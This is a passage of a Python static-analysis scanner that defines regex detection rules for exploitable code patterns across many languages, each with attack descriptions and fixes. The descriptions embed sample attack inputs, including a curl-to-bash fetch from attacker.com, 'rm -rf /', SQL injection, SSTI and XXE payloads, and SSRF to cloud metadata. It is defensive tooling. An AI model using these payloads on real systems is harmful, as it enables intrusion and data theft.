            "Run 'bundle audit' to check for known vulnerabilities.",
            "Install: gem install bundler-audit && bundle audit")

    def _audit_cargo(self, cargo_path):
        self._add_finding(
            cargo_path.relative_to(self.target_path), 0, "Cargo.lock found",
            "SEC-014", "Rust Dependency Audit Recommended", SEVERITY_INFO, "CWE-829",
            "Run 'cargo audit' to check for known vulnerabilities.",
            "Install: cargo install cargo-audit && cargo audit")

    def _audit_go(self, go_path):
        self._add_finding(
            go_path.relative_to(self.target_path), 0, "go.sum found",
            "SEC-015", "Go Dependency Audit Recommended", SEVERITY_INFO, "CWE-829",
            "Run 'govulncheck' to check for known vulnerabilities.",
            "Install: go install golang.org/x/vuln/cmd/govulncheck@latest && govulncheck ./...")


EXPLOIT_PATTERNS = {
    "cpp": [
        {"id": "EXP-CPP-001", "name": "Stack-Based Buffer Overflow Exploit Vector", "pattern": r"\b(strcpy|strcat|sprintf|gets|vsprintf)\s*\([^,]+,\s*(?:argv|getenv|fgets|recv|read|scanf)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-121", "exploit_type": "Stack Buffer Overflow", "attack_vector": "Attacker supplies oversized input via command-line args, environment variables, or network data to overwrite return address on stack", "impact": "Remote Code Execution (RCE) — attacker gains full control of process execution", "exploitability": "HIGH — well-documented technique with public tooling (pwntools, ROPgadget)", "recommendation": "Replace with bounds-checked functions. Enable stack canaries (-fstack-protector-all), ASLR, and DEP/NX."},
        {"id": "EXP-CPP-002", "name": "Heap Overflow via Unchecked malloc+memcpy", "pattern": r"\bmalloc\s*\([^)]+\)(?:[^;]*;\s*){0,3}[^;]*\b(?:memcpy|memmove|strcpy|strcat)\s*\(", "severity": SEVERITY_CRITICAL, "cwe": "CWE-122", "exploit_type": "Heap Buffer Overflow", "attack_vector": "Attacker controls size passed to malloc and data copied — corrupts heap metadata to hijack control flow", "impact": "Remote Code Execution via heap metadata corruption (unlink exploit, fastbin attack, tcache poisoning)", "exploitability": "HIGH — standard heap exploitation techniques well-documented", "recommendation": "Validate all sizes. Use calloc. Bounds-check all copies. Enable heap hardening (glibc MALLOC_CHECK_)."},
        {"id": "EXP-CPP-003", "name": "Use-After-Free Exploitable Pattern", "pattern": r"\b(?:free|delete)\s*\(?[^;]+\)?\s*;(?:[^;]*;){0,5}[^;]*\b(?:->|\.)\w+", "severity": SEVERITY_CRITICAL, "cwe": "CWE-416", "exploit_type": "Use-After-Free", "attack_vector": "Freed object's memory reallocated with attacker-controlled data — dangling pointer dereferences attacker's payload", "impact": "Remote Code Execution — attacker replaces vtable pointer or function pointer in freed memory", "exploitability": "HIGH — UAF is the #1 browser exploit class (Chrome, Firefox, Safari CVEs)", "recommendation": "Set pointer to nullptr after free. Use smart pointers. Enable AddressSanitizer for testing."},
        {"id": "EXP-CPP-004", "name": "Format String Exploit — Write Primitive", "pattern": r"\b(printf|fprintf|sprintf|syslog|err|warn)\s*\(\s*(?!\")\w+\s*[,)]", "severity": SEVERITY_CRITICAL, "cwe": "CWE-134", "exploit_type": "Format String Attack", "attack_vector": "Attacker supplies format specifiers (%x, %n, %s) in user input passed directly as format string", "impact": "Arbitrary Read/Write — %n writes to memory, %x leaks stack contents. Leads to RCE.", "exploitability": "HIGH — automated tools exist. %n can write arbitrary values to arbitrary addresses.", "recommendation": "NEVER pass user input as format string. Always: printf(\"%s\", user_input)."},
        {"id": "EXP-CPP-005", "name": "Integer Overflow Leading to Buffer Overflow", "pattern": r"\b(?:malloc|calloc|realloc|new)\s*\([^)]*[\+\*][^)]*\)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-190", "exploit_type": "Integer Overflow → Heap Overflow", "attack_vector": "Arithmetic overflow in size calculation causes small allocation — subsequent copy overflows the undersized buffer", "impact": "Heap corruption leading to RCE. Classic pattern in image parsers, protocol handlers.", "exploitability": "HIGH — common in real-world CVEs (libpng, libjpeg, ffmpeg, OpenSSL)", "recommendation": "Check for overflow before arithmetic: if (a > SIZE_MAX / b) { error; }. Use safe_multiply helpers."},
        {"id": "EXP-CPP-006", "name": "Command Injection via system()/popen()", "pattern": r"\b(system|popen)\s*\([^)]*(?:\+|strcat|sprintf|snprintf|format|argv|getenv|fgets|scanf)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-78", "exploit_type": "OS Command Injection", "attack_vector": "User input concatenated into shell command. Attacker injects: ; rm -rf / or $(reverse_shell)", "impact": "Full system compromise — arbitrary command execution as the process user", "exploitability": "CRITICAL — trivial to exploit with basic shell metacharacters (; | ` $() && ||)", "recommendation": "Never use system(). Use exec() with argument arrays. Sanitize all input."},
        {"id": "EXP-CPP-007", "name": "Double Free Heap Exploit", "pattern": r"\b(?:free|delete)\s*\(?([^;)]+)\)?\s*;[^}]*\b(?:free|delete)\s*\(?\1\)?", "severity": SEVERITY_CRITICAL, "cwe": "CWE-415", "exploit_type": "Double Free", "attack_vector": "Same memory freed twice. Second free corrupts heap freelist — attacker controls next allocation location.", "impact": "Arbitrary write primitive leading to RCE. Attacker makes malloc return controlled address.", "exploitability": "HIGH — classic heap exploit, automated with House of Force/Spirit/Lore techniques", "recommendation": "Set pointer to NULL after free. Use smart pointers. Test with AddressSanitizer."},
        {"id": "EXP-CPP-008", "name": "Race Condition — TOCTOU File Exploit", "pattern": r"\b(?:access|stat|lstat)\s*\([^)]+\)[^;]*;[^}]*\b(?:open|fopen|chmod|chown|unlink|rename|link|symlink)\s*\(", "severity": SEVERITY_HIGH, "cwe": "CWE-367", "exploit_type": "TOCTOU Race Condition", "attack_vector": "Attacker swaps file (via symlink) between check (access/stat) and use (open/chmod). Exploits the race window.", "impact": "Privilege escalation — read/write arbitrary files, including /etc/passwd or setuid binaries", "exploitability": "MEDIUM — requires timing but symlink attacks are well-automated", "recommendation": "Use fstat() on open file descriptors. Open first, then check permissions on the fd."},
        {"id": "EXP-CPP-009", "name": "Uninitialized Memory Information Leak", "pattern": r"\b(?:char|uint8_t|unsigned\s+char)\s+\w+\s*\[\s*\d+\s*\]\s*;[^}]*\b(?:send|write|fwrite|memcpy)\s*\(", "severity": SEVERITY_HIGH, "cwe": "CWE-908", "exploit_type": "Information Disclosure via Uninitialized Memory", "attack_vector": "Stack/heap buffer declared but not fully initialized — sent to network or file, leaking adjacent memory contents", "impact": "Leaks stack canaries, ASLR addresses, heap pointers, passwords, crypto keys from memory", "exploitability": "HIGH — Heartbleed (CVE-2014-0160) was exactly this pattern", "recommendation": "Always zero-initialize buffers: memset(buf, 0, sizeof(buf)) or = {0}. Use -Wuninitialized."},
        {"id": "EXP-CPP-010", "name": "Return-Oriented Programming (ROP) Gadget Surface", "pattern": r"\b(?:ret|pop\s+\w+\s*;\s*ret|xchg\s+\w+\s*,\s*esp|jmp\s+\[?\w+\]?|call\s+\[?\w+\]?)\b", "severity": SEVERITY_MEDIUM, "cwe": "CWE-693", "exploit_type": "ROP Gadget Availability", "attack_vector": "After bypassing DEP/NX, attacker chains existing code snippets (gadgets) ending in 'ret' to build arbitrary execution", "impact": "Enables code execution even with DEP enabled. Defeats W^X memory protection.", "exploitability": "MEDIUM — requires initial memory corruption bug plus gadget finding (ROPgadget tool)", "recommendation": "Enable CFI (Control Flow Integrity). Use -fcf-protection. Minimize gadget surface with LTO."},
        {"id": "EXP-CPP-011", "name": "Type Confusion via Unsafe Cast", "pattern": r"\b(?:reinterpret_cast\s*<|(?:void\s*\*)\s*\w+\s*=\s*(?:\(\s*void\s*\*\s*\))?\s*\w+|static_cast\s*<[^>]+>\s*\(\s*(?:void\s*\*|reinterpret_cast))", "severity": SEVERITY_HIGH, "cwe": "CWE-843", "exploit_type": "Type Confusion", "attack_vector": "Object cast to wrong type — attacker triggers code path that treats data as different type, corrupting vtable/function pointers", "impact": "Code execution via vtable hijacking. Common in C++ polymorphic code and browser engines.", "exploitability": "HIGH — #2 exploit class in browsers after UAF", "recommendation": "Use dynamic_cast with RTTI for safe downcasting. Avoid void* intermediaries."},
        {"id": "EXP-CPP-012", "name": "Weak Crypto — Brute-Forceable Key/Hash", "pattern": r"\b(?:DES_|RC4_|MD5_|SHA1_|SHA_Init|EVP_des_|EVP_rc4|EVP_md5)\b", "severity": SEVERITY_HIGH, "cwe": "CWE-327", "exploit_type": "Cryptographic Weakness", "attack_vector": "DES/RC4/MD5/SHA-1 are broken. Attacker can brute-force keys, forge hashes, or find collisions.", "impact": "Authentication bypass, forged signatures, decryption of encrypted data", "exploitability": "HIGH — MD5 collisions in seconds, SHA-1 in hours (SHAttered), DES in minutes", "recommendation": "Use AES-256-GCM, SHA-256/SHA-3, BLAKE2b, Argon2 for passwords."},
        {"id": "EXP-CPP-013", "name": "Null Byte Injection in String Operations", "pattern": r"\b(?:strlen|strcmp|strcpy|strcat|strstr)\s*\([^)]*\\x00|\\0[^0-9]", "severity": SEVERITY_HIGH, "cwe": "CWE-626", "exploit_type": "Null Byte Injection", "attack_vector": "Null byte truncates C string operations but not memory operations — bypass file extension checks, WAF filters", "impact": "File upload bypass (evil.php\\x00.jpg), path traversal, filter evasion", "exploitability": "HIGH — trivial to inject null bytes in HTTP requests", "recommendation": "Use length-aware string operations. Validate at binary level, not string level."},
        {"id": "EXP-CPP-014", "name": "Privilege Escalation — setuid/setgid Misuse", "pattern": r"\b(?:setuid|setgid|seteuid|setegid|setreuid|setregid)\s*\(\s*0\s*\)|#.*S_ISUID|#.*S_ISGID", "severity": SEVERITY_CRITICAL, "cwe": "CWE-250", "exploit_type": "Privilege Escalation", "attack_vector": "Program sets UID to root or uses setuid bit. Any vulnerability in this program gives root access.", "impact": "Full root/system compromise via any bug in the privileged code path", "exploitability": "HIGH — any bug in setuid binary = instant root", "recommendation": "Drop privileges immediately after acquiring resources. Use capabilities instead of setuid."},
        {"id": "EXP-CPP-015", "name": "Shared Memory Race — No Synchronization", "pattern": r"\b(?:shm_open|shmget|mmap\s*\([^)]*MAP_SHARED)\b(?!.*(?:pthread_mutex|sem_wait|flock|fcntl.*F_SETLK))", "severity": SEVERITY_HIGH, "cwe": "CWE-362", "exploit_type": "Shared Memory Race Condition", "attack_vector": "Multiple processes access shared memory without locks. Attacker process corrupts data structures during race window.", "impact": "Data corruption, privilege escalation, code execution via corrupted function pointers", "exploitability": "MEDIUM — requires local access but race windows are exploitable with spraying", "recommendation": "Use proper synchronization: mutexes, semaphores, or atomic operations on shared memory."},
    ],
    "python": [
        {"id": "EXP-PY-001", "name": "Remote Code Execution via eval/exec", "pattern": r"\b(?:eval|exec)\s*\([^)]*(?:request|input|argv|sys\.stdin|flask\.request|self\.request|params|query|body|data|payload)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-95", "exploit_type": "Remote Code Execution", "attack_vector": "User input passed directly to eval()/exec(). Attacker sends: __import__('os').system('reverse_shell')", "impact": "Full server compromise — arbitrary Python code execution with application privileges", "exploitability": "CRITICAL — trivial, single HTTP request", "recommendation": "Never eval user input. Use ast.literal_eval() for safe data parsing. Whitelist allowed operations."},
        {"id": "EXP-PY-002", "name": "Pickle Deserialization RCE", "pattern": r"\b(?:pickle\.loads?|cPickle\.loads?|shelve\.open|joblib\.load)\s*\([^)]*(?:request|recv|read|open|socket|file|data|body|payload|input)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-502", "exploit_type": "Deserialization RCE", "attack_vector": "Attacker crafts malicious pickle payload with __reduce__ method that executes arbitrary commands on load", "impact": "Remote Code Execution — attacker gets full shell on server", "exploitability": "CRITICAL — public exploit generators (pickletools, fickling)", "recommendation": "Never unpickle untrusted data. Use JSON, MessagePack, or Protocol Buffers."},
        {"id": "EXP-PY-003", "name": "SQL Injection — Database Takeover", "pattern": r'(?:execute|executemany|cursor\.execute|\.query)\s*\(\s*(?:f["\']|["\'].*(?:%s|%d|\{).*\.format\(|["\'].*\+\s*(?:request|input|params|args|data|query))', "severity": SEVERITY_CRITICAL, "cwe": "CWE-89", "exploit_type": "SQL Injection", "attack_vector": "User input interpolated into SQL. Attacker sends: ' OR 1=1-- or ' UNION SELECT password FROM users--", "impact": "Full database access — read all tables, modify data, delete records, sometimes OS command execution via xp_cmdshell", "exploitability": "CRITICAL — sqlmap automates full exploitation in seconds", "recommendation": "ALWAYS use parameterized queries. Never concatenate user input into SQL strings."},
        {"id": "EXP-PY-004", "name": "SSTI — Server-Side Template Injection RCE", "pattern": r"(?:render_template_string|Template|Jinja2|mako\.template)\s*\([^)]*(?:request|input|params|args|data|query|user)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-1336", "exploit_type": "Server-Side Template Injection", "attack_vector": "User input rendered as template code. Attacker sends: {{config}} or {{''.__class__.__mro__[1].__subclasses__()}} to get RCE", "impact": "Remote Code Execution via template engine — full server compromise", "exploitability": "HIGH — well-documented payloads for Jinja2, Mako, Tornado", "recommendation": "Never pass user input to render_template_string. Use render_template with separate template files."},
        {"id": "EXP-PY-005", "name": "Path Traversal — Arbitrary File Read", "pattern": r"(?:open|Path|send_file|send_from_directory|static_url_path)\s*\([^)]*(?:request|input|params|args|data|query|user|filename|path|file)", "severity": SEVERITY_HIGH, "cwe": "CWE-22", "exploit_type": "Path Traversal / LFI", "attack_vector": "Attacker sends: ../../etc/passwd or ....//....//etc/shadow to read arbitrary system files", "impact": "Read any file on the system — credentials, source code, private keys, /etc/shadow", "exploitability": "HIGH — trivial with ../ sequences. WAF bypass techniques well-known.", "recommendation": "os.path.realpath() + startswith() check against allowed base directory. Never use user input in paths directly."},
        {"id": "EXP-PY-006", "name": "SSRF — Internal Network Access", "pattern": r"\b(?:requests\.(?:get|post|put|delete|head|patch)|urllib\.request\.urlopen|httpx\.(?:get|post)|aiohttp\.ClientSession)\s*\([^)]*(?:request|input|params|args|data|query|user|url)", "severity": SEVERITY_HIGH, "cwe": "CWE-918", "exploit_type": "Server-Side Request Forgery", "attack_vector": "Attacker controls URL in server-side HTTP request. Sends: http://169.254.169.254/latest/meta-data/ (AWS keys) or http://localhost:6379/ (Redis)", "impact": "Access internal services, cloud metadata (AWS/GCP keys), port scan internal network, read local files via file://", "exploitability": "HIGH — cloud metadata endpoints are universally accessible from SSRF", "recommendation": "Whitelist allowed domains/IPs. Block private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x). Disable redirects."},
        {"id": "EXP-PY-007", "name": "XXE — XML External Entity Injection", "pattern": r"\b(?:xml\.etree\.ElementTree|xml\.dom\.minidom|xml\.sax|lxml\.etree)\.(?:parse|fromstring|iterparse)\s*\([^)]*(?:request|input|data|body|file|upload)", "severity": SEVERITY_HIGH, "cwe": "CWE-611", "exploit_type": "XML External Entity Injection", "attack_vector": "Attacker sends XML with: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> to read files or SSRF", "impact": "Read arbitrary files, SSRF to internal services, denial of service via billion laughs", "exploitability": "HIGH — standard payloads, works on default XML parser configurations", "recommendation": "Use defusedxml library. Or set: parser.setFeature(handler.feature_external_ges, False)"},
        {"id": "EXP-PY-008", "name": "JWT None Algorithm Bypass", "pattern": r"\bjwt\.decode\s*\([^)]*(?:algorithms\s*=\s*\[|verify\s*=\s*False|options\s*=.*verify)", "severity": SEVERITY_HIGH, "cwe": "CWE-345", "exploit_type": "JWT Authentication Bypass", "attack_vector": "Attacker changes JWT header to {\"alg\":\"none\"} and removes signature. If verify=False or algorithms list includes 'none', authentication bypassed.", "impact": "Complete authentication bypass — attacker forges any user identity", "exploitability": "HIGH — trivial to craft with jwt.io or python-jwt", "recommendation": "Always specify algorithms=['HS256'] explicitly. Never set verify=False. Use PyJWT >= 2.0."},
    ],
    "javascript": [
        {"id": "EXP-JS-001", "name": "Prototype Pollution → RCE", "pattern": r"(?:Object\.assign|_\.merge|_\.extend|_\.defaultsDeep|lodash\.merge|deepmerge)\s*\([^)]*(?:req\.body|req\.query|req\.params|request\.body|body|params|input|data)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-1321", "exploit_type": "Prototype Pollution → RCE", "attack_vector": "Attacker sends {\"__proto__\":{\"polluted\":true}} in request body — pollutes Object.prototype globally", "impact": "Bypass authentication, inject properties, achieve RCE via child_process or template engines", "exploitability": "HIGH — automated tools (pp-finder), affects lodash, jQuery, express-fileupload", "recommendation": "Use Object.create(null) for dictionaries. Validate input keys. Block __proto__, constructor, prototype."},
        {"id": "EXP-JS-002", "name": "DOM XSS via innerHTML/document.write", "pattern": r"(?:\.innerHTML|document\.write|\.outerHTML|\.insertAdjacentHTML)\s*(?:=|\()\s*(?:.*(?:location|document\.URL|document\.referrer|window\.name|decodeURIComponent|\.search|\.hash|\.href|\$\{))", "severity": SEVERITY_CRITICAL, "cwe": "CWE-79", "exploit_type": "DOM-Based Cross-Site Scripting", "attack_vector": "URL fragment/parameter reflected into DOM via innerHTML without sanitization. Attacker crafts link with: #<img src=x onerror=steal_cookies()>", "impact": "Session hijacking, credential theft, keylogging, defacement, crypto mining in victim's browser", "exploitability": "HIGH — no server interaction needed, bypasses server-side XSS filters", "recommendation": "Use textContent instead of innerHTML. If HTML needed, use DOMPurify.sanitize()."},
        {"id": "EXP-JS-003", "name": "Command Injection via child_process", "pattern": r"(?:exec|execSync|spawn|spawnSync|execFile)\s*\([^)]*(?:req\.|request\.|params|body|query|input|data|\$\{|` |\+)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-78", "exploit_type": "OS Command Injection", "attack_vector": "User input passed to child_process.exec(). Attacker sends: ; cat /etc/passwd or $(curl attacker.com/shell.sh|bash)", "impact": "Full server compromise — arbitrary OS commands as Node.js process user", "exploitability": "CRITICAL — trivial, single request", "recommendation": "Use execFile or spawn with argument arrays. Never concatenate user input into commands."},
        {"id": "EXP-JS-004", "name": "NoSQL Injection", "pattern": r"(?:\.find|\.findOne|\.update|\.delete|\.remove|\.aggregate)\s*\(\s*(?:\{[^}]*\$(?:gt|ne|regex|where|or|and|not|exists|in|nin|elemMatch))", "severity": SEVERITY_HIGH, "cwe": "CWE-943", "exploit_type": "NoSQL Injection", "attack_vector": "Attacker sends {\"username\":{\"$ne\":\"\"}} to bypass authentication or {\"$where\":\"sleep(5000)\"} for DoS", "impact": "Authentication bypass, data exfiltration, denial of service", "exploitability": "HIGH — common in MongoDB Express apps, automated tools available", "recommendation": "Validate input types (reject objects when expecting strings). Use mongoose schema validation."},
        {"id": "EXP-JS-005", "name": "Insecure JWT Verification", "pattern": r"(?:jwt\.verify|jsonwebtoken\.verify)\s*\([^)]*(?:algorithms|algorithm)\s*:\s*\[.*(?:none|HS)", "severity": SEVERITY_HIGH, "cwe": "CWE-345", "exploit_type": "JWT Algorithm Confusion", "attack_vector": "If RS256 key is used but HS256 allowed, attacker signs JWT with the public key (which is available) using HS256", "impact": "Complete authentication bypass — forge any JWT token", "exploitability": "HIGH — jwt_tool automates this attack", "recommendation": "Pin algorithm: jwt.verify(token, key, {algorithms: ['RS256']}). Never allow 'none'."},
        {"id": "EXP-JS-006", "name": "Server-Side Request Forgery (SSRF)", "pattern": r"(?:axios|fetch|got|node-fetch|request|superagent|http\.get|https\.get)\s*\(\s*(?:req\.|request\.|params|body|query|input|data|url|`)", "severity": SEVERITY_HIGH, "cwe": "CWE-918", "exploit_type": "SSRF", "attack_vector": "User-controlled URL in server-side request. Attacker targets: http://169.254.169.254/ (cloud metadata), internal services", "impact": "Cloud credential theft, internal service access, port scanning", "exploitability": "HIGH — cloud environments universally vulnerable", "recommendation": "Whitelist domains. Block private IPs. Disable redirects. Validate URL scheme."},
        {"id": "EXP-JS-007", "name": "ReDoS — Regex Denial of Service", "pattern": r"new\s+RegExp\s*\(\s*(?:req\.|request\.|params|body|query|input|data|user)", "severity": SEVERITY_HIGH, "cwe": "CWE-1333", "exploit_type": "Regular Expression Denial of Service", "attack_vector": "Attacker supplies regex with catastrophic backtracking: (a+)+ matched against 'aaaaaaaaaaaaaaaaX' hangs the process", "impact": "Server DoS — single request can hang Node.js event loop for minutes", "exploitability": "HIGH — single request, no auth needed, Node.js single-threaded", "recommendation": "Never build regex from user input. Use re2 library for safe regex. Set timeouts."},
    ],
    "typescript": [],
    "solidity": [
        {"id": "EXP-SOL-001", "name": "Reentrancy — Fund Drain Exploit", "pattern": r"\.call\{value:\s*\w+\}\s*\([^)]*\)\s*;(?:[^;]*;){0,3}[^;]*(?:\w+\s*[-+]=|\w+\s*=\s*\w+\s*[-+])", "severity": SEVERITY_CRITICAL, "cwe": "CWE-841", "exploit_type": "Reentrancy Attack", "attack_vector": "External call sends ETH to attacker contract. Attacker's receive() calls back into the vulnerable function before state updates.", "impact": "Drain entire contract balance. The DAO hack ($60M) was exactly this.", "exploitability": "CRITICAL — well-documented, public exploit code available", "recommendation": "Checks-Effects-Interactions pattern: update state BEFORE external call. Use ReentrancyGuard."},
        {"id": "EXP-SOL-002", "name": "Flash Loan Price Manipulation", "pattern": r"(?:getReserves|balanceOf|getAmountOut)\s*\([^)]*\)(?:[^;]*;){0,5}[^;]*(?:price|rate|ratio|value|amount)\s*=", "severity": SEVERITY_HIGH, "cwe": "CWE-682", "exploit_type": "Flash Loan / Price Oracle Manipulation", "attack_vector": "Attacker takes flash loan, manipulates on-chain price oracle (AMM reserves), exploits mispricing, repays loan — profit.", "impact": "Drain liquidity pools. Hundreds of DeFi exploits used this ($100M+ total losses).", "exploitability": "HIGH — flash loan services readily available (Aave, dYdX)", "recommendation": "Use time-weighted average prices (TWAP). Use Chainlink oracles. Never price from single-block reserves."},
        {"id": "EXP-SOL-003", "name": "Access Control Missing — Unprotected Function", "pattern": r"function\s+\w*(?:withdraw|transfer|mint|burn|upgrade|set|admin|owner|pause|kill|destroy|selfdestruct)\w*\s*\([^)]*\)\s*(?:public|external)(?!\s*(?:onlyOwner|onlyAdmin|onlyRole|require\s*\(\s*msg\.sender))", "severity": SEVERITY_CRITICAL, "cwe": "CWE-284", "exploit_type": "Missing Access Control", "attack_vector": "Critical function (withdraw, mint, upgrade) has no access restriction. Anyone can call it.", "impact": "Drain all funds, mint unlimited tokens, upgrade to malicious implementation", "exploitability": "CRITICAL — trivial, just call the function", "recommendation": "Add access control: onlyOwner, onlyRole, or require(msg.sender == authorized)."},
        {"id": "EXP-SOL-004", "name": "Delegatecall to Untrusted Contract", "pattern": r"\.delegatecall\s*\([^)]*(?:address|addr|target|impl|_implementation|proxy)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-829", "exploit_type": "Delegatecall Exploit", "attack_vector": "delegatecall executes external code in the caller's storage context. If target is attacker-controlled, all storage is compromised.", "impact": "Take over proxy contract. The Parity multisig hack ($30M) used delegatecall.", "exploitability": "CRITICAL if target address is user-controllable", "recommendation": "Only delegatecall to immutable, audited implementation addresses. Never from user input."},
        {"id": "EXP-SOL-005", "name": "Front-Running / MEV Exploitation", "pattern": r"(?:block\.timestamp|block\.number|blockhash)\b.*(?:random|seed|winner|lottery|reveal|commit)", "severity": SEVERITY_HIGH, "cwe": "CWE-330", "exploit_type": "Front-Running / MEV", "attack_vector": "Miners/validators see pending transactions. They reorder, insert, or censor to extract profit (sandwich attacks, liquidations).", "impact": "Steal lottery winnings, manipulate auction outcomes, extract value from every DEX trade", "exploitability": "HIGH — MEV bots operate 24/7 on Ethereum, Flashbots makes it trivial", "recommendation": "Use commit-reveal schemes. Chainlink VRF for randomness. Private transaction pools (Flashbots Protect)."},
    ],
    "rust": [
        {"id": "EXP-RS-001", "name": "Unsafe Block — Memory Safety Bypass", "pattern": r"unsafe\s*\{[^}]*(?:\*(?:const|mut)|transmute|from_raw|offset|slice_unchecked|get_unchecked)", "severity": SEVERITY_HIGH, "cwe": "CWE-119", "exploit_type": "Memory Safety Bypass", "attack_vector": "Unsafe code can dereference raw pointers, transmute types, access without bounds checks — same bugs as C/C++", "impact": "Buffer overflow, use-after-free, type confusion — all possible inside unsafe blocks", "exploitability": "MEDIUM — limited to unsafe blocks but severity same as C when exploitable", "recommendation": "Minimize unsafe surface. Wrap in safe abstraction with documented invariants. Fuzz test unsafe code."},
    ],
    "go": [
        {"id": "EXP-GO-001", "name": "SQL Injection via String Concatenation", "pattern": r'(?:\.Query|\.QueryRow|\.Exec)\s*\(\s*(?:"[^"]*"\s*\+|fmt\.Sprintf\s*\([^)]*%[svd])', "severity": SEVERITY_CRITICAL, "cwe": "CWE-89", "exploit_type": "SQL Injection", "attack_vector": "User input concatenated into SQL query string.", "impact": "Full database access and potential OS command execution", "exploitability": "CRITICAL — sqlmap automates exploitation", "recommendation": "Use parameterized queries with $1, $2 placeholders."},
        {"id": "EXP-GO-002", "name": "SSRF via User-Controlled URL", "pattern": r"http\.(?:Get|Post|NewRequest)\s*\([^)]*(?:r\.URL|r\.Form|mux\.Vars|chi\.URLParam|query\.Get)", "severity": SEVERITY_HIGH, "cwe": "CWE-918", "exploit_type": "SSRF", "attack_vector": "User-controlled URL in server HTTP request", "impact": "Access cloud metadata, internal services, port scan", "exploitability": "HIGH", "recommendation": "Whitelist domains. Block private IPs."},
    ],
    "php": [
        {"id": "EXP-PHP-001", "name": "Remote File Inclusion", "pattern": r"\b(?:include|require|include_once|require_once)\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-98", "exploit_type": "Remote/Local File Inclusion", "attack_vector": "User input in include() — attacker includes http://evil.com/shell.php or ../../etc/passwd via php:// wrappers", "impact": "Remote Code Execution (RFI) or arbitrary file read (LFI)", "exploitability": "CRITICAL — trivial if allow_url_include is on", "recommendation": "Never include user-supplied paths. Use whitelist mapping."},
        {"id": "EXP-PHP-002", "name": "PHP Object Injection via unserialize", "pattern": r"\bunserialize\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE|SERVER)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-502", "exploit_type": "PHP Object Injection", "attack_vector": "Attacker crafts serialized PHP object with magic methods (__destruct, __wakeup) that execute commands", "impact": "Remote Code Execution via POP chains", "exploitability": "HIGH — PHPGGC generates exploit chains for common frameworks", "recommendation": "Use json_decode(). Never unserialize user input."},
    ],
    "ruby": [
        {"id": "EXP-RB-001", "name": "Mass Assignment — Admin Privilege Escalation", "pattern": r"(?:\.create|\.update|\.new)\s*\(\s*params(?:\.permit!|\.to_unsafe_h|\[)", "severity": SEVERITY_HIGH, "cwe": "CWE-915", "exploit_type": "Mass Assignment", "attack_vector": "Attacker adds admin=true or role=superadmin to form submission. Without strong params, all attributes set.", "impact": "Privilege escalation to admin. GitHub was hacked via mass assignment in 2012.", "exploitability": "HIGH — trivial with curl or browser dev tools", "recommendation": "Always use strong parameters: params.require(:user).permit(:name, :email). Never permit!."},
    ],
    "shell": [
        {"id": "EXP-SH-001", "name": "Shell Injection via Unquoted Variables", "pattern": r"\b(?:eval|exec|source)\s+.*\$[{(]?\w+[})]?(?!\s*\")", "severity": SEVERITY_CRITICAL, "cwe": "CWE-78", "exploit_type": "Shell Injection", "attack_vector": "Unquoted variable in eval/exec — user input with spaces/semicolons breaks out of intended command", "impact": "Arbitrary command execution", "exploitability": "HIGH", "recommendation": "Always double-quote variables. Avoid eval."},
    ],
    "html": [
        {"id": "EXP-HTML-001", "name": "Stored XSS via Unescaped Output", "pattern": r"\{\{\s*\w+\s*\}\}|<%=\s*\w+\s*%>|<\?=\s*\$\w+", "severity": SEVERITY_MEDIUM, "cwe": "CWE-79", "exploit_type": "Cross-Site Scripting (XSS)", "attack_vector": "User-supplied data rendered in HTML without escaping. Stored XSS persists and hits every visitor.", "impact": "Session hijacking, credential theft, defacement, crypto mining", "exploitability": "MEDIUM — depends on whether template auto-escapes", "recommendation": "Ensure template engine auto-escapes. Use |escape filter. Validate/sanitize all user output."},
    ],
    "css": [],
    "sql": [
        {"id": "EXP-SQL-001", "name": "Stored Procedure Injection", "pattern": r"(?:EXEC|EXECUTE|CALL)\s+\w+\s*(?:@\w+\s*=\s*'|N')", "severity": SEVERITY_HIGH, "cwe": "CWE-89", "exploit_type": "SQL Injection via Stored Procedure", "attack_vector": "Dynamic SQL inside stored procedure with string concatenation", "impact": "Full database access, potential OS command execution via xp_cmdshell", "exploitability": "HIGH", "recommendation": "Use sp_executesql with parameters inside stored procedures."},
    ],
    "yaml": [],
    "dockerfile": [],
}

EXPLOIT_PATTERNS["typescript"] = EXPLOIT_PATTERNS["javascript"]


class ExploitDetector:
    def __init__(self, target_path):
        self.target_path = Path(target_path).resolve()
        self.findings = []
        self.exploit_chains = []
        self.skip_dirs = {
            ".git", "node_modules", "__pycache__", ".tox", "venv", "env",
            "build", "dist", "target", ".idea", ".vscode", "vendor",
            "third_party", "external", "deps", ".cache", ".next",
        }

    def detect_language(self, file_path):
        ext = file_path.suffix.lower()
        name = file_path.name
        if name == "Dockerfile" or name.startswith("Dockerfile."):
            return "dockerfile"
        if name in ("Makefile", "makefile"):
            return "makefile"
        for lang, extensions in LANG_EXTENSIONS.items():
            if ext in extensions:
                return lang
        return None

    def scan_file_for_exploits(self, file_path, language):
        patterns = EXPLOIT_PATTERNS.get(language, [])
        if not patterns:
            return

        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
                lines = content.split("\n")
        except (PermissionError, OSError):
            return

        rel_path = str(file_path.relative_to(self.target_path))

        for pattern_def in patterns:
            try:
                regex = re.compile(pattern_def["pattern"], re.IGNORECASE)
                for i, line in enumerate(lines, 1):
                    if regex.search(line):
                        ctx_before = [f"{i-j}: {lines[i-j-1].rstrip()}" for j in range(min(5, i-1), 0, -1)]
                        ctx_after = [f"{i+j}: {lines[i+j-1].rstrip()}" for j in range(1, min(6, len(lines)-i+1))]

                        rule = {
                            "id": pattern_def["id"],
                            "name": f"EXPLOIT: {pattern_def['name']}",
                            "severity": pattern_def["severity"],
                            "cwe": pattern_def.get("cwe", "N/A"),
                            "description": (
                                f"[{pattern_def['exploit_type']}] {pattern_def['name']}\n"
